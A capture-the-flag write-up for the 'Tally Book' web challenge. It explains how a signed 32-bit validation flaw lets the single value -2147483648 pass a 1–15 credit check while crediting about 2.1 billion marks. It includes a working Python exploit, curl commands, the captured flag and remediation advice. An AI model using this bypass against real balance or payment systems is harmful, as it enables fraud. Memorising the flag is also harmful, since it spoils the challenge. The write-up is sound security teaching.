# Tally Book — Web CTF Writeup

- **Event:** BUP CTF FINAL
- **Category:** Web
- **Points / Solves:** 365 pts · 8 solves
- **Author:** depro0x
- **Instance:** `https://tally-book-858f226be0a9.web.bupcopc.tech`
- **Flag:** `bupctf{B00k_ColuMn_10w3st_F1gUre}`

---

## TL;DR

A new account opens with **40 marks**; the "sealed bill" costs **250**. Each account may file
**one correction** that credits **1–15 marks** — so honest play tops out at 55, never 250.

The correction stores the figure in a **signed 32‑bit "book column"** (`[-2³¹, 2³¹−1]`). The
validator that enforces the "folds to 1–15" rule mishandles the single value **`INT_MIN` =
`-2147483648` (`0x80000000`)** — the *lowest figure the column can hold* — letting it pass the
1–15 check, while the amount actually credited (the "width") is **`abs(-2³¹) = 2147483648`**.
Filing that one correction pushes the purse to `2,147,483,688`, and buying the bill returns the flag.

```
POST /register    {"username":"solve_x","password":"pw123456"}   -> balance 40
POST /correction  {"figure":-2147483648}                          -> paid 2147483648, balance 2147483688
POST /bill        {}                                              -> sealed_bill = bupctf{B00k_ColuMn_10w3st_F1gUre}
```

---

## 1. Reconnaissance

The landing page (`/`) is a "Desk notice":

> Opening purse **40 marks** · Sealed bill **250 marks** · Correction: *one filing. The clerk
> strikes the sign in the book column, then pays that width into the purse when the folded
> figure is 1–15 marks.*

Fingerprinting (headers + behavior):

- **Stack:** Flask behind **gunicorn**; `Vary: Cookie` → session-cookie auth.
- **Hardening:** strict CSP (`default-src 'none'`), `X-Frame-Options: DENY`, `nosniff`,
  `Referrer-Policy: no-referrer`. No CSRF token in the forms.
- **Session cookie** `tally_session` is a standard Flask/`itsdangerous` signed token whose
  payload is only `{"user":"<username>"}` — the **balance lives server-side (DB), not in the cookie.**

### Route map (discovered via GET + `OPTIONS`/`Allow`)

| Route | Methods | Purpose |
|-------|---------|---------|
| `/` | GET | Desk notice |
| `/register` | GET, POST (form **or JSON**) | Create account (opens at 40) |
| `/login` | GET, POST | Sign in |
| `/logout` | POST | Sign out |
| `/desk` | GET | Dashboard: purse, correction state, buy button |
| `/correction` | POST | File the single correction (credits marks) |
| `/bill` | POST | Buy the 250 sealed bill → returns flag |

Constraints observed:

- **Username policy:** `3–24 chars, [a-z0-9_]` → no SQL injection surface; login SQLi payloads
  all return "Unknown account or password."
- **One correction per account**, enforced by a persistent DB flag ("This account already
  filed its correction.") — survives re-login.

---

## 2. The economy problem

- Purse starts at **40**, bill is **250** → `/bill` reports *"The purse is short of the sealed
  bill by 210 marks."*
- A legitimate correction credits `abs(figure)` for `figure ∈ [1,15]` (and negatives too:
  `-15` pays `15`, because the clerk *"strikes the sign"* first). Max reachable honestly = **55**.

`/bill` was confirmed to depend **only** on `balance >= 250` — it ignores every body/query
parameter and every method except POST. So the whole challenge reduces to: **make the purse ≥ 250
through the one correction.**

---

## 3. Probing the "fold"

The correction returns three distinct errors, which reveal the validation pipeline:

| Input | Response |
|-------|----------|
| `15`, `-15`, `"15"`, `" 15 "`, `"+15"`, `"0015"`, fullwidth `"１５"`, arabic `"٥"` | accepted, `paid = |value|` |
| `15.0`, `"1e2"`, `"0xf"`, `[15]`, `true`, `"1_5"` | `"A figure must be a whole number of marks."` |
| `16, 17, 31, 250, 65536, 0x11111111, 2³¹−1, …` | `"A correction must fold to 1-15 marks."` |
| `≥ 2³¹` or `< -2³¹` (e.g. `4294967296`, `-2147483649`) | `"That figure sits outside the book."` |

Inferred pipeline:

```
n = parse_int(figure)                 # strict base-10 whole number (int() on unicode digits)
if not (-2**31 <= n <= 2**31 - 1):    # the 32-bit "book column"
    -> "That figure sits outside the book."
folded = fold(n)                      # buggy narrowing to 1..15
if not (1 <= folded <= 15):
    -> "A correction must fold to 1-15 marks."
credit_purse( abs(n) )                # the "width" paid in
```

### Ruling out the obvious

To be sure the fold couldn't be beaten by magnitude, I brute-forced it:

- **Positive sweep** of 1,576 candidates across the whole `[16, 2³¹)` range (all of `16..800`,
  every `2^k ± small`, and 600 random samples) → **zero** accepted above 15.
- Type confusion (arrays/objects/bools), Unicode numeric glyphs (`⑮`, `㊿`, `Ⅴ`, `万`…),
  HTTP parameter pollution / source confusion (query vs form vs JSON, duplicate keys),
  mass-assignment (`balance` on register), a 40-way **race** on the one-correction flag, and
  duplicate registration — **all failed.** `paid` always equalled `abs(value)`, capped at 15.

The positive space was clean. The decisive move was sweeping the **negative** half — the only
part the fold treats asymmetrically because of the sign.

---

## 4. The bug — `abs(INT_MIN)` at the bottom of the book column

A focused negative sweep returned exactly one hit:

```
figure = -2147483648   ->   {"balance":2147483688,"ok":true,"paid":2147483648}
```

Boundary characterization confirms it is unique:

| figure | result |
|--------|--------|
| `-2147483648` (`-2³¹`, `0x80000000`) | ✅ accepted, **paid 2147483648** |
| `-2147483647` | ❌ "must fold to 1-15" |
| `-2147483649` | ❌ "outside the book" |
| `+2147483647` | ❌ "must fold to 1-15" |
| `+2147483648` | ❌ "outside the book" |

**Why only `-2³¹`?** The book column is a signed 32-bit field, so the range gate admits
`-2³¹` (`INT_MIN`). `INT_MIN` is the classic overflow singularity: in signed 32-bit arithmetic
`abs(-2³¹)` cannot be represented (`+2³¹` overflows the type and wraps back to `-2³¹`). The
"fold to 1–15" validator operates on that wrapped/mis-typed value and — uniquely for `0x80000000`
— lets it through, while the amount **credited into the purse uses Python's arbitrary-precision
`abs()`**, yielding the true `2³¹ = 2,147,483,648`. That check-vs-credit differential is the vuln.

This is exactly what the hints point at:
- *"the opening purse cannot cover"* the bill → you must forge balance.
- *"strikes the sign … pays that width"* → sign is stripped, `abs()` is paid.
- *"particular about how a figure is folded"* → the fold breaks on one figure.
- Flag: **`B00k_ColuMn_10w3st_F1gUre`** = the *lowest figure the book column can hold*.

---

## 5. Full exploit — end-to-end path

```python
import json, urllib.request, urllib.error, random

U = "https://tally-book-858f226be0a9.web.bupcopc.tech"

def call(method, path, payload=None, cookie=None):
    h, data = {}, None
    if payload is not None:
        data = json.dumps(payload).encode(); h["Content-Type"] = "application/json"
    if cookie: h["Cookie"] = cookie
    req = urllib.request.Request(U + path, data=data, headers=h, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        return r.getcode(), r.read().decode(), r.headers.get("Set-Cookie")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(), e.headers.get("Set-Cookie")

user = "solve_%d" % random.randint(0, 10**9)

# 1) open an account (40 marks)
_, body, ck = call("POST", "/register", {"username": user, "password": "pw123456"})
ck = ck.split(";")[0]

# 2) file the single correction with INT_MIN -> pays abs(-2**31) = 2**31
print(call("POST", "/correction", {"figure": -2147483648}, ck)[1])
#   -> {"balance":2147483688,"ok":true,"paid":2147483648}

# 3) buy the sealed bill
print(call("POST", "/bill", {}, ck)[1])
#   -> {"balance":2147483438,"ok":true,"sealed_bill":"bupctf{B00k_ColuMn_10w3st_F1gUre}"}
```

### Observed transcript

```
[1] register: 200 {"balance":40,"ok":true,"username":"solve_708020902"}
[2] correction(figure=-2147483648): 200 {"balance":2147483688,"ok":true,"paid":2147483648}
[3] buy bill: 200 {"balance":2147483438,"ok":true,"sealed_bill":"bupctf{B00k_ColuMn_10w3st_F1gUre}"}
```

### One-liner (curl)

```bash
U=https://tally-book-858f226be0a9.web.bupcopc.tech
curl -s -c j.txt -X POST $U/register   -H 'Content-Type: application/json' -d '{"username":"solve_abc","password":"pw123456"}'
curl -s -b j.txt -X POST $U/correction -H 'Content-Type: application/json' -d '{"figure":-2147483648}'
curl -s -b j.txt -X POST $U/bill       -H 'Content-Type: application/json' -d '{}'
```

---

## 6. Flag

```
bupctf{B00k_ColuMn_10w3st_F1gUre}
```

---

## 7. Remediation

- **Don't use fixed-width signed arithmetic for money.** Validate the *actual credited amount*,
  not a separately-computed "folded" proxy — check `1 <= amount <= 15` on the **same integer**
  that is added to the balance.
- **Reject `INT_MIN`/boundary values explicitly** if a bounded type is required; never rely on
  `abs()` of a signed value that can equal its type's minimum (`abs(INT_MIN)` overflows).
- Enforce the credit as `amount = value` with `value` already proven in `[1, 15]` — no negative
  input, no sign-stripping that turns a negative into a large positive.
- Server-side authoritative balance with a per-transaction cap and an audit that the delta
  applied equals the delta validated.
```
